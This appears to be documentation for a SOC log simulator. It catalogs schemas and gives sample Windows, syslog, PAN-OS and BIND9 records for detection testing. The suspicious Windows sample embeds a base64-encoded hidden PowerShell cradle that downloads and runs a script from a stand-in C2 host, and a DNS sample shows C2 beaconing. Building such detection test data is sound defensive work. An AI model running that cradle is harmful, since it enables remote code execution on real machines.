# Supported Log Sources, Fidelity Classification & Schema Catalog

## 1. Log Realism & Fidelity Tier Classification

To maintain scientific rigor and operational transparency, telemetry produced by the **SOC Telemetry Simulator** is categorized using a standardized 4-tier fidelity model:

| Fidelity Tier | Definition | Simulator Status |
| :--- | :--- | :--- |
| **Tier 1: Native Operating System Capture** | Raw binary or syslog streams captured directly from an active kernel, hypervisor, or hardware appliance. | **None** (Simulator is entirely standalone; does not run guest VMs). |
| **Tier 2: Synthetic Schema-Conformant** | Programmatically synthesized records that strictly comply with official vendor wire schemas, field names, XML namespaces, and RFC syntax without artificial wrappers. | **All Supported Sources** (Windows XML, Linux Syslog, PAN-OS CSV, BIND9 DNS). |
| **Tier 3: Vendor-Style Synthetic** | Simulated logs that emulate vendor syntax but omit complex schema headers, namespaces, or optional fields. | Not utilized (Upgraded to Tier 2). |
| **Tier 4: Generic Synthetic Logs** | Generic JSON or key-value records with an arbitrary `message` payload. | Not utilized. |

> [!IMPORTANT]
> **Scientific Integrity Notice:** All records emitted by this simulator are **Tier 2: Synthetic Schema-Conformant**. They faithfully mirror the wire syntax, data types, and field structures expected by SIEM ingestion parsers, but they originate from user-space simulation logic rather than hardware-level OS event sinks.

---

## 2. Windows Event Log XML (Security Subsystem)

- **Source Identifier:** `windows_xml`
- **Fidelity Tier:** **Tier 2: Synthetic Schema-Conformant**
- **Schema Reference:** Microsoft Windows Event Schema 2.0 (`http://schemas.microsoft.com/win/2004/08/events/event`)
- **Forwarding Compatibility:** Splunk HEC (`/services/collector/raw` or `/event`), TCP/TLS Stream (Octet-counting or newline-framed with XML pre-sanitization).
- **Validation Method:** Schema validation against Microsoft Windows Event Log XML definition; XML entity escaping check.

### 2.1 Supported Event IDs & Required Fields

| Event ID | Description | Required XML Elements & EventData Fields |
| :--- | :--- | :--- |
| **4624** | Logon Success | `TargetUserName`, `TargetDomainName`, `TargetUserSid`, `TargetLogonId`, `LogonType` (2=Interactive, 3=Network, 10=RDP), `IpAddress`, `IpPort`, `LogonProcessName`, `AuthenticationPackageName`, `WorkstationName`. |
| **4625** | Logon Failure | `TargetUserName`, `TargetDomainName`, `Status` (e.g. `0xC000006D`), `SubStatus` (e.g. `0xC000006A`), `LogonType`, `IpAddress`, `IpPort`, `FailureReason`. |
| **4688** | Process Creation | `NewProcessId`, `NewProcessName`, `CommandLine`, `ParentProcessName`, `SubjectUserSid`, `SubjectUserName`, `SubjectDomainName`, `TokenElevationType`. |
| **4720** | User Account Created | `TargetUserName`, `TargetDomainName`, `TargetSid`, `SubjectUserName`, `SubjectDomainName`, `PrivilegeList`, `SamAccountName`. |

### 2.2 Representative Raw Log Samples

#### Normal Event: Interactive Logon Success (Event 4624)
```xml
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4624</EventID><Version>2</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2026-11-12T07:15:30.123456Z'/><EventRecordID>10042</EventRecordID><Correlation/><Execution ProcessID='712' ThreadID='1420'/><Channel>Security</Channel><Computer>CORP-WKSTN-042.corp.internal</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>S-1-5-18</Data><Data Name='SubjectUserName'>CORP-WKSTN-042$</Data><Data Name='SubjectDomainName'>CORP</Data><Data Name='SubjectLogonId'>0x3e7</Data><Data Name='TargetUserSid'>S-1-5-21-3829482910-1829482910-1001</Data><Data Name='TargetUserName'>jdoe</Data><Data Name='TargetDomainName'>CORP</Data><Data Name='TargetLogonId'>0x1a8f94</Data><Data Name='LogonType'>2</Data><Data Name='LogonProcessName'>User32</Data><Data Name='AuthenticationPackageName'>Negotiate</Data><Data Name='WorkstationName'>CORP-WKSTN-042</Data><Data Name='LogonGuid'>{00000000-0000-0000-0000-000000000000}</Data><Data Name='TransmittedServices'>-</Data><Data Name='LmPackageName'>-</Data><Data Name='KeyLength'>0</Data><Data Name='ProcessId'>0x2c8</Data><Data Name='ProcessName'>C:\Windows\System32\winlogon.exe</Data><Data Name='IpAddress'>127.0.0.1</Data><Data Name='IpPort'>0</Data></EventData></Event>
```

#### Suspicious Event: Obfuscated PowerShell Execution (Event 4688, MITRE T1059.001)
```xml
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2026-11-12T07:18:45.654321Z'/><EventRecordID>10089</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='244'/><Channel>Security</Channel><Computer>CORP-WKSTN-015.corp.internal</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>S-1-5-21-3829482910-1829482910-1004</Data><Data Name='SubjectUserName'>admin_temp</Data><Data Name='SubjectDomainName'>CORP</Data><Data Name='SubjectLogonId'>0x2b4c12</Data><Data Name='NewProcessId'>0x18e4</Data><Data Name='NewProcessName'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='TokenElevationType'>%%1937</Data><Data Name='ProcessId'>0xd48</Data><Data Name='CommandLine'>powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC0AdQBwAGQAYQB0AGUALgBlAHYAaQBsAC0AYwBkAG4ALgBvAHIAZwAvAHMAYwByAGkAcAB0AC4AcABzADEAJwApAA==</Data><Data Name='ParentProcessName'>C:\Windows\System32\cmd.exe</Data></EventData></Event>
```

---

## 3. Linux Syslog (RFC 3164 & RFC 5424)

- **Source Identifier:** `linux_syslog`
- **Fidelity Tier:** **Tier 2: Synthetic Schema-Conformant**
- **Schema Reference:** IETF RFC 5424 (The Syslog Protocol) & RFC 3164 (BSD Syslog Protocol)
- **Forwarding Compatibility:** Syslog TCP/TLS (Octet-counting framed or newline-delimited), Splunk HEC.
- **Validation Method:** Regex syntax validation against RFC 5424 header structure (`<PRI>VERSION TIMESTAMP HOSTNAME APP-NAME PROCID MSGID [STRUCTURED-DATA] MSG`).

### 3.1 Supported Facilities & Programs

| Program / Subsystem | Facility | Severity | Supported Event Types |
| :--- | :--- | :--- | :--- |
| `sshd` | `authpriv` (10) | `info` (6), `warn` (4) | Public key authentication, password authentication accepted, failed password attempts, session opened/closed. |
| `sudo` | `authpriv` (10) | `notice` (5), `alert` (1) | Command execution logging with TTY, PWD, USER, and COMMAND. |
| `systemd` | `daemon` (3) | `info` (6) | Unit starting, started, stopping, stopped state machine notifications. |

### 3.2 Representative Raw Log Samples

#### Normal Event: Linux Sudo Privilege Elevation (RFC 5424)
```text
<85>1 2026-11-12T07:20:11.456123Z dmz-web-01 sudo 18452 - [audit@32473 command="/bin/systemctl restart nginx" operator="deployer"] deployer : TTY=pts/1 ; PWD=/home/deployer ; USER=root ; COMMAND=/bin/systemctl restart nginx
```

#### Suspicious Event: Linux SSH Brute Force Failure (RFC 3164, MITRE T1110.001)
```text
<86>Nov 12 07:22:04 dmz-web-02 sshd[29481]: Failed password for invalid user admin from 198.51.100.45 port 54122 ssh2
```

---

## 4. Palo Alto Networks Next-Generation Firewall (PAN-OS CSV)

- **Source Identifier:** `paloalto_panos`
- **Fidelity Tier:** **Tier 2: Synthetic Schema-Conformant**
- **Schema Reference:** Palo Alto Networks PAN-OS 10.x/11.x 54-Column Log Field Specification
- **Forwarding Compatibility:** Syslog TCP/TLS, Splunk HEC.
- **Validation Method:** Strict CSV column counting (guaranteed 54 comma-delimited fields per record).

### 4.1 Supported Log Subtypes

| Subtype | Description | Key Fields Populated |
| :--- | :--- | :--- |
| `TRAFFIC` | Flow start, allow, and deny records | `Type` (TRAFFIC), `Source IP`, `Destination IP`, `Source Port`, `Destination Port`, `Application` (ssl, web-browsing, dns, ssh), `Action` (allow, deny, drop), `Bytes Sent`, `Bytes Received`, `Packets`. |
| `THREAT` | Intrusion, spyware, and vulnerability detections | `Type` (THREAT), `Threat/Content Name`, `Threat ID`, `Severity` (critical, high, medium, low, informational), `Direction` (client-to-server), `Category`. |

### 4.2 Representative Raw Log Samples

#### Normal Event: Allowed Outbound Web Session (PAN-OS 54-Column CSV)
```csv
1,2026/11/12 07:25:00,001801002345,TRAFFIC,end,2304,2026/11/12 07:25:00,10.0.1.45,198.51.100.12,0.0.0.0,0.0.0.0,CORP-ALLOW-INTERNET,jdoe,,ssl,vsys1,Trust,Untrust,ethernet1/2,ethernet1/1,log-collector-01,2026/11/12 07:25:00,491823,1,54120,443,0,0,0x400000,tcp,allow,4521,1842,2679,14,2026/11/12 07:24:45,15,any,,0,12345678,0x0,United States,10.0.0.0-10.255.255.255,198.51.100.0-198.51.100.255,7,7,0,0,,0,,0,0,,,,0,0,0,0,
```

#### Suspicious Event: Network Service Discovery Port Scan (PAN-OS CSV, MITRE T1046)
```csv
1,2026/11/12 07:25:05,001801002345,TRAFFIC,drop,2305,2026/11/12 07:25:05,10.0.1.99,10.0.3.10,0.0.0.0,0.0.0.0,DEFAULT-DENY,,,any,vsys1,Trust,Internal,ethernet1/2,ethernet1/3,log-collector-01,2026/11/12 07:25:05,491824,1,49152,445,0,0,0x0,tcp,deny,64,64,0,1,2026/11/12 07:25:05,0,any,,0,12345679,0x0,Internal,10.0.0.0-10.255.255.255,10.0.0.0-10.255.255.255,1,0,0,0,,0,,0,0,,,,0,0,0,0,
```

---

## 5. ISC BIND9 DNS Standard Query Logs

- **Source Identifier:** `bind9_dns`
- **Fidelity Tier:** **Tier 2: Synthetic Schema-Conformant**
- **Schema Reference:** ISC BIND 9.x Query Logging Standard
- **Forwarding Compatibility:** Syslog TCP/TLS, Splunk HEC.
- **Validation Method:** BIND9 query prefix regex match (`client @0x[0-9a-f]+ <IP>#<port> \(([^)]+)\): query: <FQDN> IN <TYPE> <FLAGS>`).

### 5.1 Supported Query Types & Record Flags

- **Query Types:** `A`, `AAAA`, `TXT`, `MX`, `CNAME`, `PTR`.
- **Query Flags:** `+` (Recursion Desired), `-` (Recursion Not Desired), `E` (EDNS0 enabled), `D` (DNSSEC OK), `T` (TCP transport).

### 5.2 Representative Raw Log Samples

#### Normal Event: Internal Active Directory SRV Query
```text
12-Nov-2026 07:30:15.892 queries: info: client @0x7f8a1c001230 10.0.1.42#52104 (_ldap._tcp.dc._msdcs.corp.internal): query: _ldap._tcp.dc._msdcs.corp.internal IN SRV +E(0)K (10.0.2.10)
```

#### Suspicious Event: C2 Beaconing Query (BIND9, MITRE T1071.004)
```text
12-Nov-2026 07:30:16.104 queries: info: client @0x7f8a1c009840 10.0.1.88#61205 (a7f82b99.c2-update.evil-cdn.org): query: a7f82b99.c2-update.evil-cdn.org IN TXT +E(0) (10.0.2.10)
```

---

## 6. Summary Comparison Matrix

| Source Name | Identifier | Schema Standard | Fidelity Tier | ATT&CK Techniques | Format Validation Method |
| :--- | :--- | :--- | :---: | :--- | :--- |
| **Windows Security XML** | `windows_xml` | Event Schema 2.0 | Tier 2 | T1110.001, T1059.001 | XML Namespace & Field Match |
| **Linux Syslog** | `linux_syslog` | RFC 3164 / 5424 | Tier 2 | T1110.001 | RFC 5424 Header Parsing |
| **Palo Alto PAN-OS** | `paloalto_panos`| PAN-OS 10.x/11.x CSV | Tier 2 | T1046 | Strict 54-Column Count |
| **ISC BIND9 DNS** | `bind9_dns` | ISC BIND 9 Query | Tier 2 | T1071.004 | BIND Client Regex Match |

### Known Format Limitations
1. **Windows XML:** Emits UTF-8 XML directly. Windows EVTX binary compression is deliberately not implemented because SIEM forwarders (Splunk Universal Forwarder, Winlogbeat, Spectra Agent) unwrap EVTX into text/XML prior to network transport.
2. **PAN-OS CSV:** Fixed at 54 columns matching PAN-OS standard enterprise deployments. Custom user-defined field extensions are not appended.
